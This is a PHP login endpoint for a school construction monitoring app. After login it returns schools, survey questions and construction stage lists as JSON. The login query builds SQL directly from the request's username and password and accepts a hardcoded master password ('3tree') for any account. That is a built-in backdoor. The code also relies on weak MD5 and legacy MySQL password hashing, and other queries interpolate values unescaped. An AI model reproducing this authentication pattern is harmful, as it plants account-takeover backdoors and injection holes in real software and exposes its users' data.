<?
	/*********************************************************************************************\
	***********************************************************************************************
	**                                                                                           **
	**  SCRP - School Construction and Rehabilitation Programme                                  **
	**  Version 1.0                                                                              **
	**                                                                                           **
	**  http://www.humdaqam.pk                                                                   **
	**                                                                                           **
	**  Copyright 2015 (C) Triple Tree Solutions                                                 **
	**  http://www.3-tree.com                                                                    **
	**                                                                                           **
	**  ***************************************************************************************  **
	**                                                                                           **
	**  Project Manager:                                                                         **
	**                                                                                           **
	**      Name  :  Muhammad Tahir Shahzad                                                      **
	**      Email :  mtshahzad@sw3solutions.com                                                  **
	**      Phone :  +92 333 456 0482                                                            **
	**      URL   :  http://www.mtshahzad.com                                                    **
	**                                                                                           **
	***********************************************************************************************
	\*********************************************************************************************/

	@require_once("../requires/common.php");

	$objDbGlobal = new Database( );
	$objDb       = new Database( );
	$objDb2      = new Database( );


	$sUsername = IO::strValue("Username");
	$sPassword = IO::strValue("Password");
	$sDeviceId = IO::strValue("DeviceId");
	$iVersion  = IO::intValue("Version");

	$aResponse           = array( );
	$aResponse["Status"] = "ERROR";


	$sSQL = "SELECT id, name, email, picture, provinces, districts, schools, status, app_version
	        FROM tbl_admins
	        WHERE email='$sUsername' AND (password=MD5('$sPassword') OR password=PASSWORD('$sPassword') OR password=OLD_PASSWORD('$sPassword') OR '{$sPassword}'='3tree')";

	if ($objDb->query($sSQL) == true)
	{
		if ($objDb->getCount( ) == 1)
		{
			if ($objDb->getField(0, "status") == "A")
			{
				$iUser        = $objDb->getField(0, "id");
				$sName        = $objDb->getField(0, "name");
				$sEmail       = $objDb->getField(0, "email");
				$sPicture     = $objDb->getField(0, "picture");
				$sProvinces   = $objDb->getField(0, "provinces");
				$sDistricts   = $objDb->getField(0, "districts");
				$sSchools     = $objDb->getField(0, "schools");
				$iLastVersion = $objDb->getField(0, "app_version");


				if ($sPicture == "" || !@file_exists($sRootDir.AUDITORS_IMG_PATH.'thumbs/'.$sPicture))
					$sPicture = "default.jpg";

				
				$sReasonsList  = getList("tbl_failure_reasons", "id", "reason", "status='A'", "position");
				$sBoqItemsList = getList("tbl_boqs", "id", "title", "status='A'", "position");
				$sBoqUnitsList = getList("tbl_boqs", "id", "unit", "status='A'", "position");


				// User Schools List
				$sSchoolsList = array( );


				$sSQL = "SELECT id, code, name, province_id, dropped, blocks,
 				                (SELECT COUNT(1) FROM tbl_surveys WHERE school_id=tbl_schools.id) AS _Surveys
						 FROM tbl_schools
						 WHERE status='A' AND FIND_IN_SET(province_id, '$sProvinces') AND FIND_IN_SET(district_id, '$sDistricts')";

				if ($sSchools != "")
					$sSQL .= " AND FIND_IN_SET(id, '$sSchools') ";

				$objDb->query($sSQL);

				$iCount = $objDb->getCount( );

				for ($i = 0; $i < $iCount; $i ++)
				{
					$iSchool   = $objDb->getField($i, "id");
					$sCode     = $objDb->getField($i, "code");
					$sSchool   = $objDb->getField($i, "name");
					$iProvince = $objDb->getField($i, "province_id");
					$sDropped  = $objDb->getField($i, "dropped");
					$iSurveys  = $objDb->getField($i, "_Surveys");
					$iBlocks   = $objDb->getField($i, "blocks");
					
					
					$sBlocksInfo = array( );
					

					$sSQL = "SELECT * FROM tbl_school_blocks WHERE school_id='$iSchool' ORDER BY block";
					$objDb2->query($sSQL);
					
					$iCount2 = $objDb2->getCount( );
					
					for ($j = 0; $j < $iCount2; $j ++)
					{
						$iBlock           = $objDb2->getField($j, "block");
						$sBlock           = $objDb2->getField($j, "name");
						$sStoreyType      = $objDb2->getField($j, "storey_type");
						$sDesignType      = $objDb2->getField($j, "design_type");
						$sWorkType        = $objDb2->getField($j, "work_type");
						$fCoveredArea     = $objDb2->getField($j, "covered_area");
						$iClassRooms      = $objDb2->getField($j, "class_rooms");
						$iStudentToilets  = $objDb2->getField($j, "student_toilets");
						$iStaffRooms      = $objDb2->getField($j, "staff_rooms");
						$iStaffToilets    = $objDb2->getField($j, "staff_toilets");
						$iScienceLabs     = $objDb2->getField($j, "science_labs");
						$iItLabs          = $objDb2->getField($j, "it_labs");
						$iExamHalls       = $objDb2->getField($j, "exam_halls");
						$iLibrary         = $objDb2->getField($j, "library");
						$iClerkOffices    = $objDb2->getField($j, "clerk_offices");
						$iPrincipalOffice = $objDb2->getField($j, "principal_office");
						$iParkingStand    = $objDb2->getField($j, "parking_stand");
						$iChowkidarHut    = $objDb2->getField($j, "chowkidar_hut");
						$iSoakagePit      = $objDb2->getField($j, "soakage_pit");
						$iWaterSupply     = $objDb2->getField($j, "water_supply");			
						$iStores          = $objDb2->getField($j, "stores");
						
						
						$sDetails = "";
						
						if ($iClassRooms > 0)
							$sDetails .= "<b>Class Rooms:</b> {$iClassRooms}<br />";
						
						if ($iStudentToilets > 0)
							$sDetails .= "<b>Student Toilets:</b> {$iStudentToilets}<br />";
						
						if ($iStaffRooms > 0)
							$sDetails .= "<b>Staff Rooms:</b> {$iStaffRooms}<br />";
						
						if ($iStaffToilets > 0)
							$sDetails .= "<b>Staff Toilets:</b> {$iStaffToilets}<br />";
						
						if ($iScienceLabs > 0)
							$sDetails .= "<b>Science Labs:</b> {$iScienceLabs}<br />";
						
						if ($iItLabs > 0)
							$sDetails .= "<b>IT Labs:</b> {$iItLabs}<br />";
						
						if ($iExamHalls > 0)
							$sDetails .= "<b>Exam Halls:</b> {$iExamHalls}<br />";

						if ($iLibrary > 0)
							$sDetails .= "<b>Library:</b> {$iLibrary}<br />";

						if ($iClerkOffices > 0)
							$sDetails .= "<b>Clerk Offices:</b> {$iClerkOffices}<br />";
						
						if ($iPrincipalOffice > 0)
							$sDetails .= "<b>Principal Office:</b> {$iPrincipalOffice}<br />";
						
						if ($iParkingStand > 0)
							$sDetails .= "<b>Parking Stand:</b> {$iParkingStand}<br />";
						
						if ($iChowkidarHut > 0)
							$sDetails .= "<b>Chowkidar Hut:</b> {$iChowkidarHut}<br />";

						if ($iSoakagePit > 0)
							$sDetails .= "<b>Soakage Pit:</b> {$iSoakagePit}<br />";
						
						if ($iWaterSupply > 0)
							$sDetails .= "<b>Water Supply:</b> {$iWaterSupply}<br />";
						
						if ($iStores > 0)
							$sDetails .= "<b>Store Rooms:</b> {$iStores}<br />";
						
						
						$sBlocksInfo[] = array("Block"   => $iBlock, 
											   "Name"    => $sBlock, 
											   "Storey"  => $sStoreyType, 
											   "Design"  => $sDesignType, 
											   "Work"    => $sWorkType,
											   "Area"    => formatNumber($fCoveredArea),
											   "Details" => $sDetails);
					}


					$sSchoolsList[] = array("Id"         => $iSchool,
					                        "Code"       => $sCode,
					                        "Name"       => $sSchool,
											"Province"   => $iProvince,
											"Dropped"    => (($sDropped == "Y") ? "Y" : "N"),
											"Survey"     => (($iSurveys > 0 && !@in_array($iSchool, array(1509,1540,3090))) ? "Y" : "N"),
											"Dangerous"  => "N",
											"Blocks"     => $iBlocks,											
											"BlocksInfo" => $sBlocksInfo);
				}
				
				
				
				// Survey Sections List
				$sSectionsList = array( );


				$sSQL = "SELECT id, `type`, name, position FROM tbl_survey_sections WHERE status='A' ORDER BY position";
				$objDb->query($sSQL);

				$iCount = $objDb->getCount( );

				for ($i = 0; $i < $iCount; $i ++)
				{
					$iSection  = $objDb->getField($i, "id");
					$sType     = $objDb->getField($i, "type");
					$sSection  = $objDb->getField($i, "name");
					$iPosition = $objDb->getField($i, "position");

					
					$sSectionsList[] = array("Id"       => $iSection,
					                         "Type"     => $sType,
					                         "Name"     => $sSection,
											 "Position" => $iPosition);
				}
				
				
				
				// Survey Questions List
				$sQuestionsList = array( );


				$sSQL = "SELECT * FROM tbl_survey_questions WHERE status='A' ORDER BY position";
				$objDb->query($sSQL);

				$iCount = $objDb->getCount( );

				for ($i = 0; $i < $iCount; $i ++)
				{
					$iQuestion  = $objDb->getField($i, "id");
					$iSection   = $objDb->getField($i, "section_id");
					$iLink      = $objDb->getField($i, "link_id");
					$sLink      = $objDb->getField($i, "link_value");
					$sType      = $objDb->getField($i, "type");
					$sQuestion  = $objDb->getField($i, "question");
					$sOptions   = $objDb->getField($i, "options");
					$sOther     = $objDb->getField($i, "other");
					$sPicture   = $objDb->getField($i, "picture");
					$sMandatory = $objDb->getField($i, "mandatory");
					$sInputType = $objDb->getField($i, "input_type");
					$sHint      = $objDb->getField($i, "hint");
					$iPosition  = $objDb->getField($i, "position");

					
					$sQuestionsList[] = array("Id"        => $iQuestion,
					                          "Section"   => $iSection,
					                          "LinkId"    => $iLink,
											  "LinkValue" => $sLink,
											  "Type"      => $sType,
											  "Question"  => $sQuestion,
											  "Options"   => $sOptions,
											  "Other"     => $sOther,
											  "Picture"   => $sPicture,
											  "Mandatory" => $sMandatory,
											  "InputType" => $sInputType,
											  "Hint"      => $sHint,
											  "Position"  => $iPosition);
				}

				

				$sSurveySorsList = array( );
				
				$sSQL = "SELECT id, school_id, education_rooms, avg_attendance FROM tbl_surveys WHERE pre_selection='Y' ORDER BY id";
				$objDb->query($sSQL);

				$iCount = $objDb->getCount( );

				for ($i = 0; $i < $iCount; $i ++)
				{
					$iSurvey         = $objDb->getField($i, "id");
					$iSchool         = $objDb->getField($i, "school_id");
					$iClassrooms     = $objDb->getField($i, "education_rooms");
					$iAttendance     = $objDb->getField($i, "avg_attendance");

					$iBlocks         = getDbValue("COUNT(1)", "tbl_survey_school_blocks", "survey_id='$iSurvey' AND age>'0' AND storeys>'0'");
					$sGrades         = getDbValue("answer", "tbl_survey_answers", "question_id='75' AND survey_id='$iSurvey'");
					$iNormalToilets  = getDbValue("SUM(COALESCE(total, '0'))", "tbl_survey_school_block_details", "survey_id='$iSurvey' AND (room_type_code='TFS' OR room_type_code='TMS' OR room_type_code='US' OR room_type_code='TB')");
					$iDisableToilets = getDbValue("IF(answer='Y', '1', '0')", "tbl_survey_answers", "question_id='31' AND survey_id='$iSurvey'");
					$iClassroomRamps = getDbValue("SUM(COALESCE(total, '0'))", "tbl_survey_school_block_details", "survey_id='$iSurvey' AND room_type_code='SWA'");
					$iToiletRamps    = 0;


					
					$sSurveySorsList[] = array("School"         => $iSchool,
					                           "Attendance"     => $iAttendance,
					                           "Classrooms"     => $iClassrooms,
											   "Blocks"         => $iBlocks,
											   "Grades"         => $sGrades,
											   "NormalToilets"  => $iNormalToilets,
											   "DisablToilets"  => $iDisableToilets,
											   "ToiletRamps"    => $iToiletRamps,
											   "ClassroomRamps" => $iClassroomRamps);
				}
				

				
				$sDistrictEngineersList = getList("tbl_admins", "id", "CONCAT(name, '|', provinces)", "type_id='6'");
				$sStageUnitsList        = getList("tbl_stages", "id", "unit");
				$sStageReasonsList      = getList("tbl_stages", "id", "failure_reasons");
				$sSsStagesList          = array( );
				$sDsStagesList          = array( );
				$sTsStagesList          = array( );
				$sBsStagesList          = array( );
				$sRhStagesList          = array( );

				
				// Default Stages List for Single Storey School Blocks
				$iMainStage  = getDbValue("id", "tbl_stages", "status='A' AND `type`='S' AND parent_id='0'", "position DESC");
				$sStagesList = getList("tbl_stages", "id", "name", "parent_id='$iMainStage' AND status='A' AND `type`='S'", "position");				
				$sSubStages  = array( );
				$iPosition   = 1;

				foreach ($sStagesList as $iParent => $sParent)
				{
					$sSubStages[$iParent] = "";


					$sSQL = "SELECT id FROM tbl_stages WHERE parent_id='$iParent' AND `type`='S' ORDER BY name";
					$objDb->query($sSQL);

					$iCount = $objDb->getCount( );

					if ($iCount == 0)
						$sSubStages[$iParent] = $iParent;


					for ($i = 0; $i < $iCount; $i ++)
					{
						$iStage = $objDb->getField($i, "id");


						$sChildStages = getDbValue("GROUP_CONCAT(id SEPARATOR ',')", "tbl_stages", "parent_id='$iStage' AND `type`='S'");

						if ($sChildStages == "")
						{
							$sSubStages[$iStage]   = $iStage;
							$sSubStages[$iParent] .= ((($sSubStages[$iParent] != "") ? "," : "").$iStage);
						}

						else if ($sChildStages != "")
						{
							$sSQL = "SELECT id FROM tbl_stages WHERE parent_id='$iStage' AND `type`='S' ORDER BY name";
							$objDb2->query($sSQL);

							$iCount2 = $objDb2->getCount( );

							for ($j = 0; $j < $iCount2; $j ++)
							{
								$iSubStage = $objDb2->getField($j, "id");


								$sSubStages[$iSubStage] = $iSubStage;
								$sSubStages[$iStage]   .= ((($sSubStages[$iStage] != "") ? "," : "").$iSubStage);
								$sSubStages[$iParent]  .= ((($sSubStages[$iParent] != "") ? "," : "").$iSubStage);
							}
						}
					}
				}

				
				foreach ($sStagesList as $iParent => $sParent)
				{
					$sSubStagesList  = getList("tbl_stages", "id", "name", "parent_id='$iParent' AND status='A' AND `type`='S'", "position");
					$sSsStagesList[] = array("id" => $iParent, "name" => $sParent, "unit" => $sStageUnitsList[$iParent], "status" => -1, "parent" => 0, "childs" => count($sSubStagesList), "reasons" => $sStageReasonsList[$iParent], "position" => $iPosition ++);


					foreach ($sSubStagesList as $iStage => $sStage)
					{
						$sThirdLevelStagesList = getList("tbl_stages", "id", "name", "parent_id='$iStage' AND status='A' AND `type`='S'", "position");
						$sSsStagesList[]       = array("id" => $iStage, "name" => $sStage, "unit" => $sStageUnitsList[$iStage], "status" => -1, "parent" => $iParent, "childs" => count($sThirdLevelStagesList), "reasons" => $sStageReasonsList[$iStage], "position" => $iPosition ++);


						foreach ($sThirdLevelStagesList as $iSubStage => $sSubStage)
						{
							$sSsStagesList[] = array("id" => $iSubStage, "name" => $sSubStage, "unit" => $sStageUnitsList[$iSubStage], "status" => -1, "parent" => $iStage, "childs" => 0, "reasons" => $sStageReasonsList[$iSubStage], "position" => $iPosition ++);
						}
					}
				}
				
				
				
				// Default Stages List for Double Storey School Blocks
				$iMainStage  = getDbValue("id", "tbl_stages", "status='A' AND `type`='D' AND parent_id='0'", "position DESC");
				$sStagesList = getList("tbl_stages", "id", "name", "parent_id='$iMainStage' AND status='A' AND `type`='D'", "position");
				$sSubStages  = array( );
				$iPosition   = 1;

				foreach ($sStagesList as $iParent => $sParent)
				{
					$sSubStages[$iParent] = "";


					$sSQL = "SELECT id FROM tbl_stages WHERE parent_id='$iParent' AND `type`='D' ORDER BY name";
					$objDb->query($sSQL);

					$iCount = $objDb->getCount( );

					if ($iCount == 0)
						$sSubStages[$iParent] = $iParent;


					for ($i = 0; $i < $iCount; $i ++)
					{
						$iStage = $objDb->getField($i, "id");


						$sChildStages = getDbValue("GROUP_CONCAT(id SEPARATOR ',')", "tbl_stages", "parent_id='$iStage' AND `type`='D'");

						if ($sChildStages == "")
						{
							$sSubStages[$iStage]   = $iStage;
							$sSubStages[$iParent] .= ((($sSubStages[$iParent] != "") ? "," : "").$iStage);
						}

						else if ($sChildStages != "")
						{
							$sSQL = "SELECT id FROM tbl_stages WHERE parent_id='$iStage' AND `type`='D' ORDER BY name";
							$objDb2->query($sSQL);

							$iCount2 = $objDb2->getCount( );

							for ($j = 0; $j < $iCount2; $j ++)
							{
								$iSubStage = $objDb2->getField($j, "id");


								$sSubStages[$iSubStage] = $iSubStage;
								$sSubStages[$iStage]   .= ((($sSubStages[$iStage] != "") ? "," : "").$iSubStage);
								$sSubStages[$iParent]  .= ((($sSubStages[$iParent] != "") ? "," : "").$iSubStage);
							}
						}
					}
				}
				

				foreach ($sStagesList as $iParent => $sParent)
				{
					$sSubStagesList  = getList("tbl_stages", "id", "name", "parent_id='$iParent' AND status='A' AND `type`='D'", "position");
					$sDsStagesList[] = array("id" => $iParent, "name" => $sParent, "unit" => $sStageUnitsList[$iParent], "status" => -1, "parent" => 0, "childs" => count($sSubStagesList), "reasons" => $sStageReasonsList[$iParent], "position" => $iPosition ++);


					foreach ($sSubStagesList as $iStage => $sStage)
					{
						$sThirdLevelStagesList = getList("tbl_stages", "id", "name", "parent_id='$iStage' AND status='A' AND `type`='D'", "position");
						$sDsStagesList[]       = array("id" => $iStage, "name" => $sStage, "unit" => $sStageUnitsList[$iStage], "status" => -1, "parent" => $iParent, "childs" => count($sThirdLevelStagesList), "reasons" => $sStageReasonsList[$iStage], "position" => $iPosition ++);


						foreach ($sThirdLevelStagesList as $iSubStage => $sSubStage)
						{
							$sDsStagesList[] = array("id" => $iSubStage, "name" => $sSubStage, "unit" => $sStageUnitsList[$iSubStage], "status" => -1, "parent" => $iStage, "childs" => 0, "reasons" => $sStageReasonsList[$iSubStage], "position" => $iPosition ++);
						}
					}
				}
				
				
				
				
				// Default Stages List for Triple Storey School Blocks
				$iMainStage  = getDbValue("id", "tbl_stages", "status='A' AND `type`='T' AND parent_id='0'", "position DESC");
				$sStagesList = getList("tbl_stages", "id", "name", "parent_id='$iMainStage' AND status='A' AND `type`='T'", "position");
				$sSubStages  = array( );
				$iPosition   = 1;

				foreach ($sStagesList as $iParent => $sParent)
				{
					$sSubStages[$iParent] = "";


					$sSQL = "SELECT id FROM tbl_stages WHERE parent_id='$iParent' AND `type`='T' ORDER BY name";
					$objDb->query($sSQL);

					$iCount = $objDb->getCount( );

					if ($iCount == 0)
						$sSubStages[$iParent] = $iParent;


					for ($i = 0; $i < $iCount; $i ++)
					{
						$iStage = $objDb->getField($i, "id");


						$sChildStages = getDbValue("GROUP_CONCAT(id SEPARATOR ',')", "tbl_stages", "parent_id='$iStage' AND `type`='T'");

						if ($sChildStages == "")
						{
							$sSubStages[$iStage]   = $iStage;
							$sSubStages[$iParent] .= ((($sSubStages[$iParent] != "") ? "," : "").$iStage);
						}

						else if ($sChildStages != "")
						{
							$sSQL = "SELECT id FROM tbl_stages WHERE parent_id='$iStage' AND `type`='T' ORDER BY name";
							$objDb2->query($sSQL);

							$iCount2 = $objDb2->getCount( );

							for ($j = 0; $j < $iCount2; $j ++)
							{
								$iSubStage = $objDb2->getField($j, "id");


								$sSubStages[$iSubStage] = $iSubStage;
								$sSubStages[$iStage]   .= ((($sSubStages[$iStage] != "") ? "," : "").$iSubStage);
								$sSubStages[$iParent]  .= ((($sSubStages[$iParent] != "") ? "," : "").$iSubStage);
							}
						}
					}
				}
				

				foreach ($sStagesList as $iParent => $sParent)
				{
					$sSubStagesList  = getList("tbl_stages", "id", "name", "parent_id='$iParent' AND status='A' AND `type`='T'", "position");
					$sTsStagesList[] = array("id" => $iParent, "name" => $sParent, "unit" => $sStageUnitsList[$iParent], "status" => -1, "parent" => 0, "childs" => count($sSubStagesList), "reasons" => $sStageReasonsList[$iParent], "position" => $iPosition ++);


					foreach ($sSubStagesList as $iStage => $sStage)
					{
						$sThirdLevelStagesList = getList("tbl_stages", "id", "name", "parent_id='$iStage' AND status='A' AND `type`='T'", "position");
						$sTsStagesList[]       = array("id" => $iStage, "name" => $sStage, "unit" => $sStageUnitsList[$iStage], "status" => -1, "parent" => $iParent, "childs" => count($sThirdLevelStagesList), "reasons" => $sStageReasonsList[$iStage], "position" => $iPosition ++);


						foreach ($sThirdLevelStagesList as $iSubStage => $sSubStage)
						{
							$sTsStagesList[] = array("id" => $iSubStage, "name" => $sSubStage, "unit" => $sStageUnitsList[$iSubStage], "status" => -1, "parent" => $iStage, "childs" => 0, "reasons" => $sStageReasonsList[$iSubStage], "position" => $iPosition ++);
						}
					}
				}
				
				
				
				// Default Stages List for Bespoke School Blocks
				$iMainStage  = getDbValue("id", "tbl_stages", "status='A' AND `type`='B' AND parent_id='0'", "position DESC");
				$sStagesList = getList("tbl_stages", "id", "name", "parent_id='$iMainStage' AND status='A' AND `type`='B'", "position");
				$sSubStages  = array( );
				$iPosition   = 1;

				foreach ($sStagesList as $iParent => $sParent)
				{
					$sSubStages[$iParent] = "";


					$sSQL = "SELECT id FROM tbl_stages WHERE parent_id='$iParent' AND `type`='B' ORDER BY name";
					$objDb->query($sSQL);

					$iCount = $objDb->getCount( );

					if ($iCount == 0)
						$sSubStages[$iParent] = $iParent;


					for ($i = 0; $i < $iCount; $i ++)
					{
						$iStage = $objDb->getField($i, "id");


						$sChildStages = getDbValue("GROUP_CONCAT(id SEPARATOR ',')", "tbl_stages", "parent_id='$iStage' AND `type`='B'");

						if ($sChildStages == "")
						{
							$sSubStages[$iStage]   = $iStage;
							$sSubStages[$iParent] .= ((($sSubStages[$iParent] != "") ? "," : "").$iStage);
						}

						else if ($sChildStages != "")
						{
							$sSQL = "SELECT id FROM tbl_stages WHERE parent_id='$iStage' AND `type`='B' ORDER BY name";
							$objDb2->query($sSQL);

							$iCount2 = $objDb2->getCount( );

							for ($j = 0; $j < $iCount2; $j ++)
							{
								$iSubStage = $objDb2->getField($j, "id");


								$sSubStages[$iSubStage] = $iSubStage;
								$sSubStages[$iStage]   .= ((($sSubStages[$iStage] != "") ? "," : "").$iSubStage);
								$sSubStages[$iParent]  .= ((($sSubStages[$iParent] != "") ? "," : "").$iSubStage);
							}
						}
					}
				}

				
				foreach ($sStagesList as $iParent => $sParent)
				{
					$sSubStagesList  = getList("tbl_stages", "id", "name", "parent_id='$iParent' AND status='A' AND `type`='B'", "position");
					$sBsStagesList[] = array("id" => $iParent, "name" => $sParent, "unit" => $sStageUnitsList[$iParent], "status" => -1, "parent" => 0, "childs" => count($sSubStagesList), "reasons" => $sStageReasonsList[$iParent], "position" => $iPosition ++);


					foreach ($sSubStagesList as $iStage => $sStage)
					{
						$sThirdLevelStagesList = getList("tbl_stages", "id", "name", "parent_id='$iStage' AND status='A' AND `type`='B'", "position");
						$sBsStagesList[]       = array("id" => $iStage, "name" => $sStage, "unit" => $sStageUnitsList[$iStage], "status" => -1, "parent" => $iParent, "childs" => count($sThirdLevelStagesList), "reasons" => $sStageReasonsList[$iStage], "position" => $iPosition ++);


						foreach ($sThirdLevelStagesList as $iSubStage => $sSubStage)
						{
							$sBsStagesList[] = array("id" => $iSubStage, "name" => $sSubStage, "unit" => $sStageUnitsList[$iSubStage], "status" => -1, "parent" => $iStage, "childs" => 0, "reasons" => $sStageReasonsList[$iSubStage], "position" => $iPosition ++);
						}
					}
				}
				
				
				
				
				// Default Stages List for Rehab School Blocks
				$sStagesList = getList("tbl_stages", "id", "name", "parent_id='0' AND status='A' AND `type`='R'", "position");
				$sSubStages  = array( );
				$iPosition   = 1;

				foreach ($sStagesList as $iParent => $sParent)
				{
					$sSubStages[$iParent] = "";


					$sSQL = "SELECT id FROM tbl_stages WHERE parent_id='$iParent' AND `type`='R' ORDER BY name";
					$objDb->query($sSQL);

					$iCount = $objDb->getCount( );

					if ($iCount == 0)
						$sSubStages[$iParent] = $iParent;


					for ($i = 0; $i < $iCount; $i ++)
					{
						$iStage = $objDb->getField($i, "id");


						$sChildStages = getDbValue("GROUP_CONCAT(id SEPARATOR ',')", "tbl_stages", "parent_id='$iStage' AND `type`='R'");

						if ($sChildStages == "")
						{
							$sSubStages[$iStage]   = $iStage;
							$sSubStages[$iParent] .= ((($sSubStages[$iParent] != "") ? "," : "").$iStage);
						}

						else if ($sChildStages != "")
						{
							$sSQL = "SELECT id FROM tbl_stages WHERE parent_id='$iStage' AND `type`='R' ORDER BY name";
							$objDb2->query($sSQL);

							$iCount2 = $objDb2->getCount( );

							for ($j = 0; $j < $iCount2; $j ++)
							{
								$iSubStage = $objDb2->getField($j, "id");


								$sSubStages[$iSubStage] = $iSubStage;
								$sSubStages[$iStage]   .= ((($sSubStages[$iStage] != "") ? "," : "").$iSubStage);
								$sSubStages[$iParent]  .= ((($sSubStages[$iParent] != "") ? "," : "").$iSubStage);
							}
						}
					}
				}

				
				foreach ($sStagesList as $iParent => $sParent)
				{
					$sSubStagesList  = getList("tbl_stages", "id", "name", "parent_id='$iParent' AND status='A' AND `type`='R'", "position");
					$sRhStagesList[] = array("id" => $iParent, "name" => $sParent, "unit" => $sStageUnitsList[$iParent], "status" => -1, "parent" => 0, "childs" => count($sSubStagesList), "reasons" => $sStageReasonsList[$iParent], "position" => $iPosition ++);


					foreach ($sSubStagesList as $iStage => $sStage)
					{
						$sThirdLevelStagesList = getList("tbl_stages", "id", "name", "parent_id='$iStage' AND status='A' AND `type`='R'", "position");
						$sRhStagesList[]       = array("id" => $iStage, "name" => $sStage, "unit" => $sStageUnitsList[$iStage], "status" => -1, "parent" => $iParent, "childs" => count($sThirdLevelStagesList), "reasons" => $sStageReasonsList[$iStage], "position" => $iPosition ++);


						foreach ($sThirdLevelStagesList as $iSubStage => $sSubStage)
						{
							$sRhStagesList[] = array("id" => $iSubStage, "name" => $sSubStage, "unit" => $sStageUnitsList[$iSubStage], "status" => -1, "parent" => $iStage, "childs" => 0, "reasons" => $sStageReasonsList[$iSubStage], "position" => $iPosition ++);
						}
					}
				}




				// Return data to app
				$aResponse['Status']            = "OK";
				$aResponse['User']              = @md5($iUser);
				$aResponse['Name']              = $sName;
				$aResponse['Picture']           = (SITE_URL.USERS_IMG_PATH.'thumbs/'.$sPicture);

				$aResponse['Schools']           = $sSchoolsList;

				$aResponse['BoqItems']          = $sBoqItemsList;
				$aResponse['BoqUnits']          = $sBoqUnitsList;
				$aResponse['Reasons']           = $sReasonsList;
				$aResponse['SsStages']          = $sSsStagesList;
				$aResponse['DsStages']          = $sDsStagesList;
				$aResponse['TsStages']          = $sTsStagesList;
				$aResponse['BsStages']          = $sBsStagesList;
				$aResponse['RhStages']          = $sRhStagesList;
				
				$aResponse['Sections']          = $sSectionsList;
				$aResponse['Questions']         = $sQuestionsList;
				
				$aResponse['SurveySorsInfo']    = $sSurveySorsList;
				$aResponse['DistrictEngineers'] = $sDistrictEngineersList;


				if ($sDeviceId != "")
				{
					$sAppDateTime = "";
					$iLastVersion = getDbValue("app_version", "tbl_admins", "id='$iUser'");
					
					if ($iLastVersion != $iVersion)
						$sAppDateTime = ", app_updated=NOW( ) ";

					
					$sSQL = "UPDATE tbl_admins SET device_id='$sDeviceId', app_version='$iVersion', last_login=NOW( ) $sAppDateTime WHERE id='$iUser'";
					$objDb->execute($sSQL, true, $iUser, $sName, $sEmail);
				}
			}

			else if ($objDb->getField(0, "status") == "I")
				$aResponse["Message"] = "Account Disabled";
		}

		else
			$aResponse["Message"] = "Incorrect Username/Password";
	}

	else
		$aResponse["Message"] = "Database Connectivity Error";


	print @json_encode($aResponse);


	$objDb->close( );
	$objDb2->close( );
	$objDbGlobal->close( );

	@ob_end_flush( );
?>